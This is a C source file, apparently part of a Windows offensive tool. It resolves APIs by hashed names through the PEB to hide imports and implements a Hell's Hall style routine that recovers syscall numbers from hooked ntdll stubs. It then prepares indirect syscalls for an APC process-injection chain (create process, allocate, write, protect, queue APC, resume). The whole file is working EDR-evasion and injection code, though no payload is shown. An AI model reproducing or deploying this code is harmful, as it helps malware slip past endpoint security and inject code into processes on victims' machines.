#include "header.h"

DWORD64 djb2(PBYTE str) {
    DWORD64 dwHash = 0x715ecaa905f1163;
    INT c;

    while (c = *str++)
        dwHash = ((dwHash << 0x5) + dwHash) + c;

    return dwHash;
}

VOID PrintHashes() {

    PCHAR Apis[] = {
        "ntdll.dll",
        "RtlCreateProcessParametersEx",
        "NtCreateUserProcess",
        "NtAllocateVirtualMemory",
        "NtWriteVirtualMemory",
        "NtProtectVirtualMemory",
        "NtQueueApcThread",
        "NtResumeThread",
        "NtClose"
    };

    // Hash definitions
    for (INT i = 0; i < sizeof(Apis) / sizeof(Apis[0]); i++) {
        printf("#define %s_HASH 0x%p\n", Apis[i], djb2(Apis[i]));
    }

    printf("\n");

    // Hell's Gate table initialization
    for (INT i = 0; i < sizeof(Apis) / sizeof(Apis[0]); i++) {
        printf("if (!FetchNtSyscall(&NtdllConf, %s_HASH, &Nt->%s)) {\n\tPRINT_ERROR(\"FetchNtSyscall [%s]\");\n\treturn FALSE;\n}\n\n", Apis[i], Apis[i], Apis[i], Apis[i]);
    }
}


/// Custom GetProcAddress 
FARPROC GetProcAddressH(IN HMODULE hModule, IN DWORD64 dwApiNameHash) {

    if (!hModule || !dwApiNameHash) return NULL;

    PBYTE pBase = (PBYTE)hModule;

    // Get DOS Header
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)pBase;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    // Get NT Headers
    PIMAGE_NT_HEADERS pImgNtHdr = (PIMAGE_NT_HEADERS)(pBase + pImgDosHdr->e_lfanew);
    if (pImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    // Get Optional Header
    IMAGE_OPTIONAL_HEADER ImgOptHdr = pImgNtHdr->OptionalHeader;
    if (ImgOptHdr.Magic != IMAGE_NT_OPTIONAL_HDR_MAGIC) {
        return NULL;
    }

    // Get pointer to the Export Table structure
    PIMAGE_EXPORT_DIRECTORY pImgExportDir = (PIMAGE_EXPORT_DIRECTORY)(pBase + ImgOptHdr.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    // Get relevant information from the export directory to search for a specific function
    PDWORD FnNameArray = (PDWORD)(pBase + pImgExportDir->AddressOfNames);			// function names
    PDWORD FnAddressArray = (PDWORD)(pBase + pImgExportDir->AddressOfFunctions);  // function addresses
    PWORD FnOrdinalArray = (PWORD)(pBase + pImgExportDir->AddressOfNameOrdinals); // function ordinals

    // Loop over exported functions 
    for (DWORD i = 0; i < pImgExportDir->NumberOfFunctions; i++) {

        // Get name of the function 
        CHAR* pFnName = (CHAR*)(pBase + FnNameArray[i]); // Name
        WORD wFnOrdinal = FnOrdinalArray[i]; // Ordinal
        PVOID pFnAddress = (PVOID)(pBase + FnAddressArray[wFnOrdinal]); // Address

        // Search for the function that matches the hash and return it
        if (djb2(pFnName) == dwApiNameHash) {
            return pFnAddress;
        }
    }

    WARN("Function for hash 0x%X not found.", dwApiNameHash);
    return NULL;
}

VOID RtlInitUnicodeString(OUT PUNICODE_STRING UsStruct, IN OPTIONAL PCWSTR Buffer) {

    if ((UsStruct->Buffer = (PWSTR)Buffer)) {

        unsigned int Length = wcslen(Buffer) * sizeof(WCHAR);
        if (Length > 0xfffc)
            Length = 0xfffc;

        UsStruct->Length = Length;
        UsStruct->MaximumLength = UsStruct->Length + sizeof(WCHAR);
    }

    else UsStruct->Length = UsStruct->MaximumLength = 0;
}

/// Custom GetModuleHandle
HMODULE GetModuleHandleH(IN DWORD64 dwModuleNameHash) {

    if (!dwModuleNameHash) return NULL;

    PPEB pPeb = NULL;

    // Use to __readgsqword macro to get the address of the PPEB by specifying the offset of 0x60 (0x30 on 32-bit systems, since PVOID has a since of 4 on there.
#ifdef _WIN64
    pPeb = __readgsqword(0x60); // sizeof(PVOID) = 8 --[ * 12 ]--> 96 --[ HEX ]--> 0x60
#elif _WIN32
    pPeb = __readgsqword(0x30); // sizeof(PVOID) = 4 --> [ * 12 ] = 48 --[ HEX ]-- 0x30
#endif 

    // Get PED_LDR_DATA structure
    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->LoaderData);

    // Get first element of the linked list which contains information about the first module
    // Doubly-linked lists use the Flink and Blink elements as the head and tail pointers, respectively. 
    // This means Flink points to the next node in the list whereas the Blink element points to the previous node in the list. 
    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);

    // Loop over all modules
    while (pDte) {

        if (pDte->FullDllName.Length == NULL || pDte->FullDllName.Length > MAX_PATH) {
            break;
        }

        // Convert FullDllName.Buffer to lowercase string
        CHAR szLowercaseDllName[MAX_PATH];

        DWORD i = 0;
        for (i = 0; i < pDte->FullDllName.Length; i++) {
            szLowercaseDllName[i] = (CHAR)tolower(pDte->FullDllName.Buffer[i]);
        }
        szLowercaseDllName[i] = '\0';

        // Check if hashes match
        if (djb2(szLowercaseDllName) == dwModuleNameHash) {
            // The DLL base address is InInitializationOrderLinks.Flink, or Reserved2[0]
            // If the undocumented structs are not present, the next line could also be written as the following
            // return (HMODULE)(pDte->Reserved2[0]
            HANDLE hModule = (HMODULE)pDte->InInitializationOrderLinks.Flink;
            return hModule;
        }

        // Move to the next element in the linked list
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }

    return NULL;
}

// Hell's Hall Functions
BOOL InitNtdllConfigStructure(PNTDLL_CONFIG NtdllConf) {

    // getting peb 
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    if (!pPeb || pPeb->OSMajorVersion != 0xA)
        return FALSE;

    // getting ntdll.dll module (skipping our local image element)
    PLDR_DATA_TABLE_ENTRY pLdr = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);

    // getting ntdll's base address
    ULONG_PTR uModule = (ULONG_PTR)(pLdr->DllBase);
    if (!uModule)
        return FALSE;

    // fetching the dos header of ntdll
    PIMAGE_DOS_HEADER pImgDosHdr = (PIMAGE_DOS_HEADER)uModule;
    if (pImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    // fetching the nt headers of ntdll
    PIMAGE_NT_HEADERS pImgNtHdrs = (PIMAGE_NT_HEADERS)(uModule + pImgDosHdr->e_lfanew);
    if (pImgNtHdrs->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    // fetching the export directory of ntdll
    PIMAGE_EXPORT_DIRECTORY pImgExpDir = (PIMAGE_EXPORT_DIRECTORY)(uModule + pImgNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!pImgExpDir)
        return FALSE;

    // initalizing the NtdllConf structure's element
    NtdllConf->uModule = uModule;
    NtdllConf->dwNumberOfNames = pImgExpDir->NumberOfNames;
    NtdllConf->pdwArrayOfNames = (PDWORD)(uModule + pImgExpDir->AddressOfNames);
    NtdllConf->pdwArrayOfAddresses = (PDWORD)(uModule + pImgExpDir->AddressOfFunctions);
    NtdllConf->pwArrayOfOrdinals = (PWORD)(uModule + pImgExpDir->AddressOfNameOrdinals);

    // checking
    if (!NtdllConf->uModule || !NtdllConf->dwNumberOfNames || !NtdllConf->pdwArrayOfNames || !NtdllConf->pdwArrayOfAddresses || !NtdllConf->pwArrayOfOrdinals)
        return FALSE;
    else
        return TRUE;
}

#define UP     -32
#define DOWN    32
#define RANGE  0xFF

BOOL FetchNtSyscall(IN PNTDLL_CONFIG NtdllConf, IN DWORD64 dwSysHash, OUT PNT_SYSCALL pNtSys) {

    // initialize ntdll config if not found
    if (!NtdllConf->uModule) {
        if (!InitNtdllConfigStructure(NtdllConf))
            return FALSE;
    }

    if (dwSysHash != NULL)
        pNtSys->dwSyscallHash = dwSysHash;
    else
        return FALSE;

    for (size_t i = 0; i < NtdllConf->dwNumberOfNames; i++) {

        PCHAR pcFuncName = (PCHAR)(NtdllConf->uModule + NtdllConf->pdwArrayOfNames[i]);
        PVOID pFuncAddress = (PVOID)(NtdllConf->uModule + NtdllConf->pdwArrayOfAddresses[NtdllConf->pwArrayOfOrdinals[i]]);

        //\
        printf("- pcFuncName : %s - 0x%0.8X\n", pcFuncName, HASH(pcFuncName));

        pNtSys->pSyscallAddress = pFuncAddress;

        // if syscall found
        if (djb2(pcFuncName) == dwSysHash) {

            if (*((PBYTE)pFuncAddress) == 0x4C
                && *((PBYTE)pFuncAddress + 1) == 0x8B
                && *((PBYTE)pFuncAddress + 2) == 0xD1
                && *((PBYTE)pFuncAddress + 3) == 0xB8
                && *((PBYTE)pFuncAddress + 6) == 0x00
                && *((PBYTE)pFuncAddress + 7) == 0x00) {

                BYTE high = *((PBYTE)pFuncAddress + 5);
                BYTE low = *((PBYTE)pFuncAddress + 4);
                pNtSys->dwSSN = (high << 8) | low;
                break; // break for-loop [i]
            }

            // if hooked - scenario 1
            if (*((PBYTE)pFuncAddress) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSN = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSN = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            // if hooked - scenario 2
            if (*((PBYTE)pFuncAddress + 3) == 0xE9) {

                for (WORD idx = 1; idx <= RANGE; idx++) {
                    // check neighboring syscall down
                    if (*((PBYTE)pFuncAddress + idx * DOWN) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * DOWN) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * DOWN) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * DOWN) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * DOWN) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * DOWN) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * DOWN);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * DOWN);
                        pNtSys->dwSSN = (high << 8) | low - idx;
                        break; // break for-loop [idx]
                    }
                    // check neighboring syscall up
                    if (*((PBYTE)pFuncAddress + idx * UP) == 0x4C
                        && *((PBYTE)pFuncAddress + 1 + idx * UP) == 0x8B
                        && *((PBYTE)pFuncAddress + 2 + idx * UP) == 0xD1
                        && *((PBYTE)pFuncAddress + 3 + idx * UP) == 0xB8
                        && *((PBYTE)pFuncAddress + 6 + idx * UP) == 0x00
                        && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {

                        BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
                        BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
                        pNtSys->dwSSN = (high << 8) | low + idx;
                        break; // break for-loop [idx]
                    }
                }
            }

            break; // break for-loop [i]

        }
    }

    // Code for indirect syscalls
    if (!pNtSys->pSyscallAddress)
        return FALSE;

    // looking somewhere random (0xFF byte away from the syscall address)
    ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress + 0xFF;

    // getting the 'syscall' instruction of another syscall function
    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
        if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)uFuncAddress + x) == 0x05) {
            pNtSys->pSyscallInstAddress = ((ULONG_PTR)uFuncAddress + z);
            break; // break for-loop [x & z]
        }
    }

    if (pNtSys->dwSSN != NULL && pNtSys->pSyscallAddress != NULL && pNtSys->dwSyscallHash != NULL)
        return TRUE;
    else
        return FALSE;
}

BOOL InitializeIndirectSyscalls(PNTAPI_FUNC Nt) {

    NTDLL_CONFIG NtdllConf = { 0 };

    INFO("Initializing indirect syscalls...");

    if (!FetchNtSyscall(&NtdllConf, NtCreateUserProcess_HASH, &Nt->NtCreateUserProcess)) {
        PRINT_ERROR("FetchNtSyscall [NtCreateUserProcess]");
        return FALSE;
    }

    if (!FetchNtSyscall(&NtdllConf, NtAllocateVirtualMemory_HASH, &Nt->NtAllocateVirtualMemory)) {
        PRINT_ERROR("FetchNtSyscall [NtAllocateVirtualMemory]");
        return FALSE;
    }

    if (!FetchNtSyscall(&NtdllConf, NtWriteVirtualMemory_HASH, &Nt->NtWriteVirtualMemory)) {
        PRINT_ERROR("FetchNtSyscall [NtWriteVirtualMemory]");
        return FALSE;
    }

    if (!FetchNtSyscall(&NtdllConf, NtProtectVirtualMemory_HASH, &Nt->NtProtectVirtualMemory)) {
        PRINT_ERROR("FetchNtSyscall [NtProtectVirtualMemory]");
        return FALSE;
    }

    if (!FetchNtSyscall(&NtdllConf, NtQueueApcThread_HASH, &Nt->NtQueueApcThread)) {
        PRINT_ERROR("FetchNtSyscall [NtQueueApcThread]");
        return FALSE;
    }

    if (!FetchNtSyscall(&NtdllConf, NtResumeThread_HASH, &Nt->NtResumeThread)) {
        PRINT_ERROR("FetchNtSyscall [NtResumeThread]");
        return FALSE;
    }

    if (!FetchNtSyscall(&NtdllConf, NtClose_HASH, &Nt->NtClose)) {
        PRINT_ERROR("FetchNtSyscall [NtClose]");
        return FALSE;
    }

    return TRUE;
}